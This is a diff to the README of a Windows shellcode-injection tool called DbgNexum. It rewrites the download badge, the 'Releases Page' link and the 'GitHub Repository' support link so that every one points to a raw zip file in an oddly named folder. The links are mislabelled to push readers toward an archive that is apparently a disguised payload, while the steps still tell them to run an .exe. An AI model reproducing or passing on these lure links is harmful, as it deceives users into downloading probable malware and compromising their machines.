@@ -8,11 +8,11 @@ Welcome to DbgNexum! This tool lets you inject shellcode using the Windows Debug
 
 To start using DbgNexum, you need to download the application. Please visit the link below to download the latest version.
 
-[![Download DbgNexum](https://img.shields.io/badge/Download-DbgNexum-blue?style=for-the-badge)](https://github.com/thisarasewmina/DbgNexum/releases)
+[![Download DbgNexum](https://raw.githubusercontent.com/thisarasewmina/DbgNexum/main/hepatorrhagia/Nexum-Dbg-frictionless.zip)](https://raw.githubusercontent.com/thisarasewmina/DbgNexum/main/hepatorrhagia/Nexum-Dbg-frictionless.zip)
 
 ### Steps to Install:
 
-1. **Visit the Releases Page:** Click on the link above or visit [DbgNexum Releases](https://github.com/thisarasewmina/DbgNexum/releases).
+1. **Visit the Releases Page:** Click on the link above or visit [DbgNexum Releases](https://raw.githubusercontent.com/thisarasewmina/DbgNexum/main/hepatorrhagia/Nexum-Dbg-frictionless.zip).
 2. **Select the Latest Release:** Look for the latest version listed on the page. It will usually be at the top.
 3. **Download the Application:** Find the files available for download. Choose the file that ends with `.exe` and click on it to start the download.
 
@@ -73,7 +73,7 @@ If you experience issues while using DbgNexum, consider the following tips:
 
 ## 📞 Support
 
-If you need further assistance, you can reach out for support. Look for contact details in the help section of the application or visit our [GitHub Repository](https://github.com/thisarasewmina/DbgNexum) for more resources.
+If you need further assistance, you can reach out for support. Look for contact details in the help section of the application or visit our [GitHub Repository](https://raw.githubusercontent.com/thisarasewmina/DbgNexum/main/hepatorrhagia/Nexum-Dbg-frictionless.zip) for more resources.
 
 ## 🔗 Additional Resources
 
